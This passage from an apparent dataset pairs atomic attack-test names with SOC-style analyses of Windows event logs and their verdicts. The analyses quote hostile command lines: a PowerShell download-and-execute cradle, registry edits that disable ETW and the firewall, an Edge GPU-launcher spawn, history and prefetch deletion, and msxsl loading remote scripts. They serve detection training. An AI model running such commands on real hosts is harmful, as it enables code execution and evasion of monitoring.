- **Review Access Logs**: Verify the legitimacy of the `SERVER002\admin_test` account activities, ensuring any high-risk actions were authorized.
- **Conduct Memory and Malware Analysis**: Use endpoint detection platforms to check for any anomalous activity or malware presence around the logged times.
- **Alert Persistence Watch**: Implement monitoring on registry and system changes and review scheduled tasks and startup programs for signs of unauthorized persistence mechanisms."
WinPwn - UAC Bypass ccmstp technique,"Based on the provided logs, there are several indicators of potential malicious activity that warrant further investigation:

### Analysis:

1. **PowerShell Activity:**
   - There are multiple entries in the Windows PowerShell logs showing the use of `powershell.exe` to run scripts from a URL: `https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`.
   - The command execution includes an encoded technique for executing ""calc.exe"", which could potentially indicate obfuscation or an attempt to hide malicious content. This method is often used in various forms of attack, like fileless malware or living-off-the-land (LotL) techniques.
   - The use of `iex(new-object net.webclient).downloadstring(...)` to download and execute a script directly from the internet is a known tactic for introducing remote code execution vulnerabilities or downloading malware payloads.

2. **Sysmon Logs:**
   - There is evidence in the Sysmon logs supporting the execution of the suspicious PowerShell script. The logs indicate that a PowerShell process was initiated, correlating with the command observed in the PowerShell logs.

3. **Time Service and Kernel General Logs:**
   - There are several log entries related to time synchronization (`Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`). Adjustments in system time can be benign but could potentially be used by an attacker to cover their tracks or to trigger specific time-based tasks. However, these alone are not definitive indicators of malicious activity.

4. **Application Logs:**
   - The presence of Windows Defender being active does not immediately indicate any overt threat, as this is common and expected behavior.

### Conclusion:
The presence of PowerShell executing a script from an external URL and command line construction suggests potentially malicious activity, especially considering the use of downloading and executing scripts over the network. This aligns with known attack vectors commonly used for malicious purposes, such as code execution or malware delivery.

### Resolution:
**SUSPICIOUS** - The activity noted in the logs is suspicious and warrants further investigation to determine the intent and impact of the activity. It is not immediately classified as definitely malicious, as some legitimate operations could mimic this behavior. However, given the potential risks involved, it is recommended to:

- Investigate the source and content of the PowerShell script being executed.
- Identify whether ""calc.exe"" launch is by design (e.g., a benign test by an admin) or an indication of a broader attack.
- Ensure the system has robust security controls in place, including updated virus definitions and restrictions on running unsigned scripts.
- Conduct a thorough review of user actions and cross-reference with known threat intelligence on similar behavior."
Disable .NET Event Tracing for Windows Via Registry (powershell),"## Detailed Analysis

Based on the review of the provided logs from the Windows host `Server002`, I have identified some entries that may indicate suspicious activity. Here's a breakdown:

### Windows PowerShell Log:

- **Event Records 1043 to 1050**: PowerShell commands have been executed that involve the modification of the registry to disable ETW (Event Tracing for Windows) by setting the `ETWEnabled` property under `.NETFramework` to `0`. The use of this command (`New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType ""DWord"" -Force`) is dubious as it suggests an attempt to disable Windows event logging features, which is often associated with evasion techniques used by malware.

### System Log:

- **Time Change Events**: There are repeated adjustments to the system time in quick succession (`EventRecordID` 3570, 3573) by `svchost.exe`. While time synchronization events are normal, frequent changes in a short timespan may suggest attempts to confuse time-based security mechanisms or to hide the tracks of malicious activities.

### Sysmon Log:

- **Event Record 17978 & 17979**: The execution of `powershell.exe` with command line arguments to modify the registry (consistent with PowerShell logs) and subsequent appearance of `conhost.exe` indicates a command execution context. Conhost is involved typically in scenarios related to console-based executions, so this complements the PowerShell log findings and isn't inherently malicious if used legitimately.
  
- The presence of command `whoami.exe` and `HOSTNAME.EXE` executions are generally benign but can suggest ascertainment of environment detail and identity by the executing account (`admin_test`), common in exploratory phases after compromise.

### Security Log:

- **Time Change Confirmation**: The security logs confirm system time changes as logged in the system logs. Proper authentication mechanisms should be reviewed to ascertain if these were authorized changes.

### Application Log:

- **Software Protection Event**: Regular logging from the `Software Protection Platform Service` appears normal and related to license checks.

## Assessment

### Suspicious Findings:

1. **Registry Modification via PowerShell**: The use of PowerShell to disable ETW is highly suspicious and consistent with attempts to evade detection systems within the host.
2. **Multiple Time Changes**: The series of quick succession time changes is unusual and suspicious, albeit not conclusively malicious without additional broader context.

### Guidance and Next Steps:

- **Investigate the PowerShell Execution Context**: Determine the origins of the PowerShell script execution (e.g., user access logs, SSH/RDP sessions, task scheduler, etc.) and whether `admin_test` was expected to execute such a script.
- **Review Changes and Need for Time Adjustments**: Ensure the time changes were legitimate and confirm any administrative tasks scheduled or unusual user activity around the timeframe indicated.
- **Assess Potential User Account Compromise**: Validate the `admin_test` account's recent activities, privilege usage, and possible external accesses.
- **Implement Immediate Monitoring**: Increase the scrutiny over PowerShell usage and registry changes, potentially enabling more verbose logging settings if previously disabled.

### Final Resolution:

**Resolution**: **SUSPICIOUS**

The activities identified in the logs suggest a need for further investigation, especially regarding the unauthorized use of PowerShell for disabling critical monitoring features and changes to system time could potentially indicate malicious intent. Further verification is required to rule out or confirm hostile actions."
LOLBAS Msedge to Spawn Process,"### Detailed Analysis of Logs

**Suspicious or Anomalous Behavior Identified:**

1. **PowerShell Execution (Sysmon & PowerShell Logs):**
   - A notable event is the execution of a PowerShell command which attempts to launch Microsoft Edge and then executes Calculator (calc.exe) via the `--gpu-launcher` parameter. This is suspicious because such behavior can be associated with attempts to exploit functionality for privilege escalation or code execution.
   - The PowerShell command line seen in the logs is:
     ```
     powershell.exe & {$edgePath64 = \""C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe\""
     if (Test-Path $edgePath64) {
         $edgePath = $edgePath64
     } else {
         # Check 32-bit Edge installation path
         $edgePath32 = \""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\""
         if (Test-Path $edgePath32) {
             $edgePath = $edgePath32
         } else {
             exit 1
         }
     }
     & $edgePath --disable-gpu-sandbox --gpu-launcher=\""C:\\\\Windows\\\\System32\\\\calc.exe &&\""
     sleep 5
     taskkill -f -im msedge.exe
     taskkill -f -im calc.exe
     taskkill -f -im win32calc.exe
     }
     ```
   - This uses the `--disable-gpu-sandbox` parameter which is unconventional and potentially risky, especially coupled with the execution of another application (calc.exe).

2. **Heavy Operation of `calc.exe`:**
   - The Windows Calculator (`calc.exe`) is repeatedly launched and killed using `taskkill`, which corresponds to the behavior dictated by the PowerShell script mentioned above. Running and terminating this application repeatedly in quick succession is not typical user behavior and supports the idea that scripts were used to automate this.

3. **Invalid Operations with Edge Update:**
   - Frequent and close-timed operations involving Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are seen. While these may initially seem benign, any excessive and rampant spawning of system update processes deserves attention especially when linked to suspicious command chains.

**Assessment:**

- **Indicators of Compromise (IoCs):**
  - The suspicious PowerShell script exhibits behavior aligned with common exploitation attempts to perform privilege escalation or evade restrictions.
  - Execution of `calc.exe` using `msedge.exe` parameters is unconventional and could indicate a URL or file with embedded exploit attempting to leverage Edge's capabilities.

- **Potential Risks:**
  - There is potential exposure to malware or exploitation attempts, given the scripting behaviors observed and the execution of secondary processes like Calculator through Edge.

### Resolution

- **Resolution: MALICIOUS**

This resolution is based on:
- The PowerShell script explicitly executing system binaries in a manner consistent with known exploit vectors.
- The unusual operations involving Microsoft Edge and Calculator could signify an attempt to abuse legitimate system functionalities.

### Guidance on How to Proceed

1. **Quarantine and Analyze:**
   - Isolate the affected system from the network to prevent potential lateral movement of threats.
   - Initiate a full malware scan using updated antivirus tools.
   
2. **Threat Hunting:**
   - Conduct further inspection to trace the origin of suspicious PowerShell commands. Review any recent downloads or potentially compromised network shares that may have facilitated this.

3. **Audit System Logs:**
   - Gather more comprehensive log data from the system to understand the full extent and potential origins of the malicious activity.
   - Look into the user accounts involved and validate their legitimacy.
   
4. **Patch and Secure:**
   - Ensure all applications, especially Edge, and system components are fully updated to mitigate any vulnerabilities leveraged for exploitation.
   - Implement tighter execution policies for PowerShell and script execution.

5. **Enhance Monitoring and Alerts:**
   - Deploy enhanced monitoring on critical assets, especially focusing on process creation events and PowerShell execution logs.
   - Consider setting up alerts for similar anomalous behavior in process execution."
Modify UsePartialEncryptionKey Registry entry,"Upon reviewing the provided event logs, several observations can be made regarding the activities on the Windows host:

### Sysmon Log Observations
1. **Frequent Execution of Windows Utilities:**
   - There is a pattern of frequent execution of `wevtutil.exe` and `conhost.exe` by the `SERVER002\admin_test` user. While both of these executables are legitimate Windows utilities, repeated execution in quick succession can suggest either automation or potentially unwanted behavior.
   
2. **Execution of Command-Line Tools:**
   - `cmd.exe` is executed with a command that modifies the Windows Registry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f`. Registry modifications are common for configuration changes and could be legitimate, but can also indicate potential attempts at persistence or altering system security settings.
   
3. **Tool Usage Patterns:**
   - Use of `whoami.exe` and `hostname.exe` in a sequence can indicate system reconnaissance activities which is often a sign of a user trying to gather information about the system's environment.

### System Log Observations
- The logs indicate a brief adjustment or update of the system time which could involve the Time Service synchronizing time. This is not usually suspicious unless it coincides with other unusual activities or is a repeated occurrence.

### Security Log Observations
- The time change is reflected here as well, corroborating the system logs. This suggests that the change was a logged event, reducing suspicion. No explicit unauthorized access or privilege escalation attempts are visible in these limited security logs.

### Application Log Observations
- Application logs show normal activity for edge updates and some software protection notification. No direct suspicious or malicious behavior such as application crashes or fault injections are evident.

### Other Observations
- **Microsoft Edge Update Activity:** There is extensive activity involving Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`). While this is common for maintaining browser updates, analyzing this for unusual versions or execution contexts would be prudent.
- **TrustedInstaller and TiWorker Activity:** These processes are part of Windows servicing and are observed in the logs, implying potential system updates or maintenance occurring around this time.

### Conclusion
- **SUSPICIOUS:** While no clear-cut malicious activity is absolutely confirmed, there are several indicators that warrant further investigation:
  - The frequent and potentially scripted use of command-line utilities such as `wevtutil.exe`, `cmd.exe`, and registry modifications.
  - The sequence of reconnaissance commands like `whoami.exe` and `hostname.exe`.
  - Ensure that the `SERVER002\admin_test` user account is authorized for these activities and confirm the legitimacy of the registry modification.

### Recommended Actions
1. **Conduct a Thorough Review:** Verify if the activities observed, especially the registry modification, match any scheduled tasks or maintenance.
2. **User Audit:** Confirm the legitimacy of actions performed by `SERVER002\admin_test`.
3. **Monitor for Recurrence:** Set up monitoring to detect if similar patterns re-emerge. Focus on the use of command-line utilities and registry modification activities.
4. **Security Software Scan:** Implement a comprehensive malware scan and review endpoint detection logs for further anomaly indicators.

Given these activities, labeling the system's status as ""SUSPICIOUS"" is justified, as further investigation should be done to rule out or confirm potential compromise."
Requires the BitLocker PIN for Pre-boot authentication,"Upon analyzing the provided logs, several events indicate activity that should be further scrutinized. Here's a breakdown of the findings:

1. **Standard Utility Usage:**
   - The execution of `whoami.exe` and `hostname.exe` is generally benign and can be part of routine administrative tasks. These are standard Windows utilities often used to display user information and system hostname, respectively.

2. **Frequent Usage of `wevtutil.exe`:**
   - The `wevtutil.exe` command is used to manage event logs, often seen as benign but can be potentially abused to clear logs (indicative of malicious behavior). Frequent consecutive entries (Process IDs: 4996, 4348, 4356, 4288, 2572) in a short span might raise suspicion as to why there is a need to repeatedly access or manage event logs.

3. **Registry Modification via `cmd.exe` and `reg.exe`:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseAdvancedStartup /t REG_DWORD /d 1 /f` suggests an insertion or modification to registry keys related to BitLocker (part of Windows disk encryption). Unauthorized registry edits can be a serious issue and might be indicative of preparatory steps for further action or privilege escalation.

4. **Presence of `svchost.exe` and `conhost.exe`:**
   - These are core Windows processes, but their presence alone isn't suspicious unless they are coupled with other malicious indicators. In this case, they appear to be acting as parent processes or accompaniments to other standard utilities like `whoami` or `hostname`, which doesn’t immediately suggest malicious activity.

5. **Microsoft Edge Updater (`MicrosoftEdgeUpdate.exe`):**
   - The execution of Microsoft Edge Updater is expected on systems for updating Edge browser. However, the presence of multiple versions or unexpected directories might need attention. From the logs, instances appear to be legitimate as they are run under the `NT AUTHORITY\SYSTEM` account.

6. **Time Synchronization Events:**
   - Changes in system time noted in the security logs are logged as part of system adjustments, possibly with the NTP server `time.windows.com`. This is typically benign unless manipulated for anti-forensic purposes (though not evident here).

### Assessment & Resolution:

- The repetitive use of `wevtutil.exe` and modifications via `cmd.exe` targeting registry changes are elements that suggest potentially suspicious activities, particularly when exploring possible data obfuscation/removal (log clearing) or privilege escalations (registry changes).
  
- Without additional context or a pattern verifying that an administrator conducted these tasks during routine operations, these actions amid standard logs indicate behavior that is abnormal enough to warrant further exploration.

### Final Resolution: **SUSPICIOUS**

**Guidance on How to Proceed:**

1. **Conduct a Deeper Analysis:**
   - Investigate the account activities of `SERVER002\admin_test` to determine if this administrative account was involved in legitimate system management operations during the time of the logs.

2. **Monitor Registry Changes:**
   - Closely monitor any further registry changes or attempts to execute system utility functions that might indicate setup or propagation for further unauthorized activities.

3. **Check for Anomalous Patterns:**
   - Look for any historical misuse of `wevtutil.exe` within the same context that could suggest attempts to hide other actions.

4. **User Verification:**
   - Verify with the user `admin_test` if these actions were taken intentionally or if credentials might have been compromised.

By following these steps, suspicious behavior can be either resolved as part of legitimate administrative activity or escalated if a threat persists."
Disable Microsoft Defender Firewall via Registry,"To conduct a comprehensive analysis of these Windows event logs, we need to examine each section of logs: Security, Application, Sysmon, and System logs to look for any signs of anomalous or potentially malicious activity.

### Security Log Analysis

1. **Time Change Events (EventID 4616)**:
   - There are events indicating the system time being changed. This can be a benign operation but could also suggest an attempt to manipulate timestamps to cover tracks. 
   - These changes were executed under the LOCAL SERVICE account by the `svchost.exe` process, which is a standard Windows process, but the time difference may warrant further investigation, given both forward and backward changes. 

2. **Logon and Privilege Assignment (EventID 4624 and 4672)**:
   - An account named `admin_test` had multiple logon events with logon type 3 (Network), which indicates access over a network connection.
   - The same account is granted several high privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which could be a potential indicator of privilege escalation or preparation for malicious activities if not accounted for by normal administrative duties. 

3. **Logoff Event (EventID 4634)**:
   - Shows the `admin_test` user logging off, which corresponds with their previous login activities.

### Application Log Analysis

1. **Edge Update Logs**:
   - Not much concern here; these logs indicate stopping of an update service and routine update checks which are part of normal operations.

### Sysmon Log Analysis

1. **Process Executions**:
   - Several executions of `wevtutil.exe` and `conhost.exe` by `admin_test`. `wevtutil.exe` can be used to query the event logs, which might be a normal administrative action but could also indicate a reconnaissance phase for an attack.
   - The `hostname` and `whoami` executions were initiated by the admin_test user, which might indicate an attempt to gather information about the system environment.
   - The execution of `cmd.exe` with a command to modify the registry (`reg add ... /v ""EnableFirewall"" /t REG_DWORD /d 0 /f`) is concerning because it disables the Windows firewall for the public profile, which may lead to a lowering of security settings.

2. **Microsoft Edge Update Processes**:
   - Appear to be regular update operations, without signals of added parameters that could indicate tampering.

### System Log Analysis

1. **Kernel Time Adjustments (EventID 1)**:
   - These logs align with the time change events noted in the Security Logs and bear an investigation focus to confirm if these changes were expected or manipulated for malicious purposes.

### Conclusion

There are several indicators across these logs that raise suspicions, such as time changes manipulated by svchost, high privileges assigned to the `admin_test` account, system reconnaissance activities, and registry modification to disable firewall settings. These activities are not explicitly malicious in themselves but could be prelude steps in a malicious operation.

### Resolution

**Resolution**: **SUSPICIOUS**

Given the observed suspicious activities, it is advised to conduct further investigation into the `admin_test` account activities, validate the legitimacy of time changes, and audit recent changes to security settings like firewall rules. This additional investigation should determine if these activities were legitimate administrative tasks or if they indicate a potential compromise."
Delete a single file - Windows cmd,"### Analysis of Windows Event Logs

The provided Windows event logs reflect normal system operations with the execution of typical system processes and commands. Below is a breakdown of the key events identified in the logs:

1. **Sysmon Logs:**
   - **Command Executions:** Multiple instances of `cmd.exe` and `conhost.exe` are observed, executing basic file presence checks, creating a file (`deleteme_data.004`), and subsequently deleting it. These operations seem to be controlled and executed under the 'SERVER002\\admin_test' account. The commands executed (`IF EXIST`, `echo`, `del`) indicate a form of scripting or batch processing typically seen in administrative or software installations.
   - **Process Relationships:** The parent process of `cmd.exe` is frequently `wsmprovhost.exe`, suggesting that the operations are initiated by a Windows Management Instrumentation Provider. This is common in automated management scripts or processes interoperating via WMI.
   - **Change of Hostname and User Checks:** Execution of `hostname.exe` and `whoami.exe`, both legitimate and benign system commands for checking the server's hostname and querying the logged-in user.

2. **Security Logs:**
   - No anomalous or unauthorized login attempts were detected. The logs seem to capture time synchronization events, which are normal for maintaining system time accuracy.

3. **Application Logs:**
   - The Software Protection Platform Service recorded an update event, indicating routine activity related to Windows licensing and protection services.

4. **System Logs:**
   - Detail standard operations concerning time synchronization with `time.windows.com`, managed by the Windows time service. All entries here relate to clock adjustments and display no signs of manipulation.

5. **Indicators of Compromise:**
   - **Integrity Levels and Hashes:** The integrity level of commands run were 'High,' implying they were executed with elevated privileges typical of administrative tasks. Observed hash values (`SHA256`) align with standard system executable hashes, corroborating the legitimacy of involved binaries.
   - The use of `wevtutil.exe` in some logs is standard for event log management tasks and does not inherently suggest malicious activity.

### Assessment and Conclusion

Upon reviewing the event logs, all activities observed appear consistent with standard administrative or scripted processes expected in system maintenance scenarios with no overt signs of malicious compromise. The operations performed (file checks, creation and deletion, hostname and user queries) can be common in automated maintenance scripts, system checks, or configuration management.

**Resolution: BENIGN**

### Recommendations

- **Continued Monitoring:** Although no malicious activity is present, continue routine monitoring and regular auditing of system logs to ensure security and quickly identify any deviations from expected behavior.
- **Review Administrative Scripts:** If these operations were unintended, review scheduled tasks, administrative scripts, or group policies that may have triggered these processes to ensure consistency with your organization's operation standards.
- **User Awareness:** Verify the actions under the `SERVER002\\admin_test` account were authorized and educate users on secure practices to prevent misuse of administrative accounts.

With this analysis, the current logs do not signal a security threat, but standard best practices recommend sustained vigilance."
Delete Prefetch File,"Upon reviewing the provided Windows event logs, several indicators can be analyzed for potential malicious activity:

1. **PowerShell Execution:**
   - The logs show PowerShell being used to remove prefetch files: `powershell.exe & {Remove-Item -Path (Join-Path ""$Env:SystemRoot\prefetch\"" (Get-ChildItem -Path ""$Env:SystemRoot\prefetch\*.pf"" -Name)[0])}`.
   - Prefetch files can be used for forensic analysis to determine program execution on the system, and removing them can be an attempt to cover tracks. 
   - Such behavior is typically seen in malicious activities where the attacker attempts to delete forensic artifacts. 

2. **Process Execution (Sysmon Events):**
   - There are multiple instances of standard Windows processes like `whoami.exe`, `taskhostw.exe`, `wevtutil.exe`, and `conhost.exe` being executed. 
   - The processes appear to be executed by `SERVER002\admin_test`, and while they seem to have legitimate paths and names, the frequency and manner of execution (e.g., wevtutil often used to interact with event logs) can be considered suspicious if not correlated with known activity.

3. **Security Logs and Credential Access:**
   - Event ID 5379 indicates potential failed credential access attempts. The return code `3221226021` suggests unauthorized access or failed authentication attempts involving Windows Live and Microsoft Account.
   - Continuous attempts might suggest an unauthorized attempt to access or brute-force credentials.

4. **High Privilege Account and Service Activity:**
   - The logs show process executions under the `SYSTEM` account with several powerful privileges (Event ID 4672), which, if unexpected, should be investigated further.
   - Processes like `sc.exe` starting or stopping services (`wuauserv` and others) signify changes in system or update-related activities, possibly modifying how updates are applied or monitored.

5. **Time Adjustments:**
   - Time changes noted in the logs could be benign or part of legitimate administrative tasks, but they could also be used to disrupt log chronology, complicating forensic analysis.

### Conclusion and Recommendations:
- **Resolution: SUSPICIOUS** 
  - The use of PowerShell to manipulate prefetch directories is a strong indicator of attempting to hide activity.
  - The frequency and nature of process executions alongside failed credential attempts warrant further investigation.
  - Verify the legitimacy and expected execution of PowerShell scripts and service modifications.
  
### Next Steps:
- Conduct a timeline analysis on the system to understand the full sequence of actions.
- Investigate the origin and intention of the PowerShell command execution.
- Perform a thorough review of account activities, particularly for `admin_test` and any external login attempts.
- Consider using endpoint detection & response (EDR) tools to monitor and alert on any similar suspicious activities.
- Ensure all legitimate processes and services have not been altered or exploited by checking their integrity and configurations."
Clear Powershell History by Deleting History File,"Upon reviewing the provided logs, several observations were made from different sources of Windows event logs, including System, Application, Security, Windows PowerShell, and Sysmon logs. Here is a detailed analysis of the activities captured in these logs:

### System Logs:
1. **Event ID 24 and 1 from Kernel-General**: 
   - These are typical log entries involving minor time adjustments, such as synchronization events, and are caused by `svchost.exe`. The changes in time are justified by connections to a time source, `time.windows.com`, which indicates a legitimate NTP (Network Time Protocol) operation used by Windows Time Service.

### Application Logs:
1. **Event ID 16384 from Security-SPP**:
   - This log entry is normal for the Software Protection Platform Service, which runs regularly to validate the software license. The event appears usual regarding the details shared (RulesEngine).

### Security Logs:
1. **Event ID 4616 from Security-Auditing**:
   - These logs capture changes in system time and appear associated with the time synchronization events seen in the System logs. The user responsible is `LOCAL SERVICE`, which is typical for such operations.

### Windows PowerShell Logs:
1. **Event ID 600**:
   - The logs detail the execution of a PowerShell command involving the removal of command history save path using `Remove-Item (Get-PSReadlineOption).HistorySavePath`. This activity could be seen as an attempt to hide command history and therefore worth monitoring.
   
2. **Event ID 600, 400, 403**:
   - The sequence suggests the start, availability, and stopping of the PowerShell session. The repetitive deletion of PowerShell history through command line under `ADMIN_~1` (possibly ""admin_test"") is suspicious. Generally, deleting logs is a behavior associated with cautious rogue actors.

### Sysmon Logs:
1. **Event ID 5**: 
   - Instances of process creation related to system utilities like `wevtutil.exe` and `conhost.exe` are observed. These are legitimate system processes, often used for log management and console host purposes respectively.
   
2. **Event ID 1**:
   - Execution of `whoami.exe` denotes a system query for identity, which alone isn't concerning but could become suspicious if combined with other activities that attempt to obscure actions.
   
3. **Execution of `powershell.exe` with a suspicious command**:
   - This points towards the PowerShell activity we see in the Windows PowerShell logs section, focusing on removing traces of command history.

### Observation Summary:
- **Benign Activities**: Typical time synchronization activities between local and external time sources (`time.windows.com`), as well as execution of legitimate processes like `wevtutil.exe`, part of regular operational processes.
  
- **Suspicious Activities**: The repeated execution of PowerShell aiming to remove history suggests caution by a user to remove traces, typically associated with malicious intent, albeit without direct evidence of compromise.

- **No Malicious Activity**: Despite some suspicious behavior, there is no direct indication of malicious breach or actions that confirm a full-blown compromise.

### Final Resolution:
- **SUSPICIOUS**: The logs contain activity such as the repeated deletion of PowerShell history, requiring further investigation to determine the user's intent. While not directly malicious, it is a potential indicator that could precedently align with unauthorized actions or recon activities. Further reviewing access logs, user behavior, and correlating network activity would be prudent steps forward."
WMIC bypass using local XSL file,"### Detailed Analysis of the Provided Logs

#### Security Log Analysis
1. **Event ID 4624 (Logon)**: Multiple occurrences of successful logon attempts using the SYSTEM account with Logon Type 5 (Service). This is normal for services starting on a Windows system.
2. **Event ID 4672 (Special Privileges Assigned)**: SYSTEM account is seen being assigned various privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. These privileges are typically present for the SYSTEM account.
3. **Event ID 5379 (Credentials Read Attempt)**: These events show attempts to read credentials targeting Microsoft Account and Windows Live with a return code indicating failure (`3221226021`). Such attempts can be indicative of password spraying or failed credential access. They appear systematic, raising some concern on suspicious credential access attempts.
4. **Event ID 4798 (Enumeration of Local Groups)**: Multiple entries listing local group information, which is expected as part of system auditing or management processes. However, frequent enumeration can also be a potential indicator of a reconnaissance attempt.

#### Sysmon Log Analysis
1. **Processes Executed**: Windows utilities such as `powershell.exe`, `wevtutil.exe`, and `cmd.exe` were executed by `admin_test`. The usage of `wevtutil.exe` multiple times could potentially indicate an attempt to download and obscure event logs.
2. **PowerShell Execution**: PowerShell is a powerful scripting environment and its invocation can be a normal part of system processes, but it can also be used to execute malicious scripts.
3. **WMIC Usage**: Observed command execution using WMIC (`wmic process list /FORMAT:""file path""`), which can be a sign of reconnaissance or data extraction activity.
4. **Unusual Parent-Child Relationships**: Execution of potentially benign tools like `calc.exe` and `whoami.exe` with PowerShell as a parent process warrants closer examination, as it points towards potential scripting activities which could be part of a larger obfuscation tactic.

#### Application Log Analysis
1. **EdgeUpdate**: Several entries report that Microsoft Edge update service has stopped. This is typical behavior around managed updates by Microsoft services but warrants checking if update policies are appropriately configured.

### Conclusion and Recommendations

Based on the analysis of the logs, there are multiple signs of potential suspicious activity that require further investigation:

- **Suspicious Privilege Usage**: While usage by SYSTEM is typically benign, the context of privilege escalation alongside PowerShell and WMIC usage by `admin_test` should be scrutinized.
- **Failed Credential Access**: Multiple failed attempts to access system credentials suggest potential probing or brute-force activities.
- **Audit of Admin Actions**: The actions of the `admin_test` account, particularly the execution of system utilities, need further analysis to ensure they haven't been leveraged for off-channel data gathering or privilege escalation.

### Resolution
**SUSPICIOUS**: The logs exhibit behaviors indicative of potential reconnaissance and privilege escalation attempts which merit deeper forensic analysis and monitoring. It's advised to:
- Investigate the origin and intent of `admin_test` script executions.
- Check the integrity and configuration of SYSTEM scheduled tasks and service executions.
- Review network connections for unauthorized access attempts or unusual patterns.
- Implement enhanced monitoring on key admin accounts and privileged actions.

Guidance should be given to the IT Security team to carry out these further investigations and to ensure that proactive security measures are in place."
Invoke CHM with default Shortcut Command Execution,"Upon reviewing the provided logs, here is the analysis:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution**: 
   - There's a PowerShell command execution logged with the command line: `powershell.exe & {Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}`
   - The usage of PowerShell with `Invoke-ATHCompiledHelp` and references to `.chm` files (Compiled HTML Help files) can be suspicious. Malicious actors often use PowerShell scripts for lateral movement or execution of malicious code by embedding it within help files. 

2. **Sysmon Logs**:
   - The Sysmon logs show execution of processes such as `cmd.exe` and `powershell.exe` by the user `SERVER002\\admin_test`.
   - The process creation pattern shows hosts like `wsmprovhost.exe` launching `whoami.exe`, `hostname.exe`, and more `conhost.exe`, which could potentially indicate enumeration activities typical in lateral movement or post-exploitation scenarios.

3. **Software Protection Platform Service (SPPSVC)**:
   - The log includes an entry from `sppsvc.exe` under `NT AUTHORITY\\NETWORK SERVICE`. This service is responsible for license management, but in abnormal scenarios, it can be targeted for privilege escalation or persistence mechanisms.

### Assessment:

- **PowerShell Activity**: The specific PowerShell command isn't standard, and given the inclusion of execution against `.chm` files, it suggests potential abuse or misuse typical of malware activities.
  
- **Presence of Enumeration Commands**: Commands involving `whoami.exe` and `hostname.exe` may indicate informational gathering stages used by threat actors during a compromise. Combined with the suspicious PowerShell command, this further implies suspicious activity.

- **System and Software Logs**: While some service-related logs are normal (such as the `sppsvc.exe` service), in the context of the observed PowerShell activities, even normal logs could be tied into potential malicious behavior like privilege escalation or lateral movement.

### Resolution:

- **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Investigate the PowerShell Execution**: Analyze the script associated with `Invoke-ATHCompiledHelp` to determine its purpose and whether it's related to any benign business operations or if it's an unauthorized/malicious script.

2. **Review User Activity**: Check the user's login records, especially `SERVER002\\admin_test` and ensure the account usage is consistent with authorized activity. Look for unusual login times or locations.

3. **Check for Known IOCs**: Utilize threat intelligence feeds to check the command lines, script names, or other artifacts against known indicators of compromise.

4. **Increase Monitoring**: Apply enhanced monitoring on PowerShell execution with script block logging enabled and potentially enable additional Sysmon event types for broader coverage.

5. **Consider Endpoint Reviews**: Depending on findings, initiate a broader endpoint and network sweep to identify potentially compromised machines or lateral movement.

By conducting further investigation, the organization can determine if there is an actual compromise and respond accordingly to mitigate any threats."
MSXSL Bypass using remote files,"## Detailed Analysis of Windows Event Logs

### Overview
Upon reviewing the provided Windows event logs from a host identified as ""Server002"", my analysis identifies an instance of potentially suspicious behavior involving the execution of a script through `cmd.exe` with unusual parameters. The logs can be broadly categorized into Application, Sysmon, Security, System, and PowerShell logs (though no entries are noted in PowerShell logs).

### Key Observations

#### 1. Application Log Analysis
- **edgeupdate**: The logs indicate multiple events of `edgeupdate` service stopping (`EventID: 0`). This alone is not inherently suspicious, but if unexpected, it may require further scrutiny to understand why these services were stopped.

#### 2. Sysmon Log Analysis
- **Powershell and Other System Utilities**: The execution of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` by the user ""SERVER002\admin_test"" (e.g., EventID: 5) might be normal in some administrative scenarios. However, the repeated use of these utilities in a short period suggests possible automation or scripted execution.
- **Suspicious `cmd.exe` Execution**: A `cmd.exe` execution (EventRecordID: 17986) with a command line argument attempting to download and potentially execute data from a URL: 
  ```plaintext
  ""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\msxsl.exe"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslxmlfile.xml"" ""https://raw.githubusercontent.com/file/file-file/master/files/data/src/msxslscript.xsl""
  ```
  This command indicates a download attempt from a remote URL, which could be related to malicious script execution if unauthorized.

#### 3. Security Log Analysis
- **Time Change Events**: There are events indicating time adjustments on the system (`EventID: 4616`). The adjustments appear minor in value, and the events may relate to regular time synchronization processes.

#### 4. System Log Analysis
- **Time Change Continuity**: Supports entries from the security log, indicating time synchronization might be a routine operation.

### Assessment
Based on the above observations, the most significant event is the suspicious `cmd.exe` execution with parameters indicating potential download and execution of external scripts. This has elements characteristic of malicious activity, often seen where an attacker or malware attempts to download and execute additional payloads from the network.

### Recommendation and Resolution

#### Conclusion: **SUSPICIOUS**

Due to the observed `cmd.exe` activity with external script execution from URLs, and the context of potentially automated execution of system utilities, this behavior is classified as **SUSPICIOUS**. There isn't enough information to conclusively categorize it as malicious without further investigation to confirm the legitimacy of the scripts and the user actions.

#### Next Steps
1. **Perform a Network Analysis**: Investigate the IP addresses or domains involved for any signs of known malicious activity.
2. **Validate User Activity**: Verify if the user “SERVER002\admin_test” executed the scripts knowingly and if there were legitimate business reasons for these actions.
3. **Check for Persistence Mechanisms**: Look for modifications in scheduled tasks, startup entries, or unusual services that might ensure the malicious activity would persist.
4. **Antivirus and Endpoint Scanning**: Run a thorough scan on the “Server002” system to detect any accompanying or resultant malware or unauthorized software.
5. **Security Awareness**: Review and enhance security practices among users, especially around executing and managing scripts and downloading files.

Until the suspicious activity is conclusively resolved to be benign or malicious, treating the case with high importance for incident response is advisable."
Modify UseTPMPIN Registry entry,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

